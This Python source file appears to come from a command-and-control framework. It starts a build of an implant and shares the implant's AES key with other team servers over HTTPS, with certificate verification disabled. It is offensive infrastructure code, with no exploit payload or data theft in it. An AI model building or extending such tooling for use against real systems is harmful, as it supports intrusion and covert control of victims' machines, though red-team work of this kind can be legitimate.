import httpx

from infra.database.database import AesKeys, sqlite_db
from infra.general.create_log import logger, write_log
from launcher.utils.config import config
from utils.querys import generate_tag
from .utils import parse_server
from .steps.compilation.core import main as compile_implant


async def push_aes_key(tag, body):
    # Sends the implant aes key to the other team servers listed in the build
    cfg = body.get("config") or {}
    protocol = str(cfg.get("protocol") or "").strip().lower()
    if protocol not in ("http", "https") or len(cfg.get("servers") or {}) < 2:
        return
    rows = await sqlite_db.read(AesKeys, tag=tag)
    key = rows[0].key if rows else ""
    shared = str((config.get("config") or {}).get("sync_aes_key") or "").strip()
    if not key or not shared:
        return
    async with httpx.AsyncClient(verify=False, timeout=10) as client:
        for hp in (cfg.get("servers") or {}).values():
            _, _, origin, _ = parse_server(str(hp or "").strip(), protocol)
            if not origin:
                continue
            try:
                await client.post(f"{origin}/sync-aes", json={"tag": tag, "key": key, "auth": shared})
            except Exception as exc:
                write_log(logger, "warning", f"Aes key sync failed for {origin} | {exc}")


async def main(body):
    # Creates a tag, starts the implant build and shares the key with the other team servers
    tag = generate_tag()
    result = await compile_implant(body, tag)
    if isinstance(result, dict) and result.get("status") == "success":
        try:
            await push_aes_key(tag, body)
        except Exception:
            pass
    return result
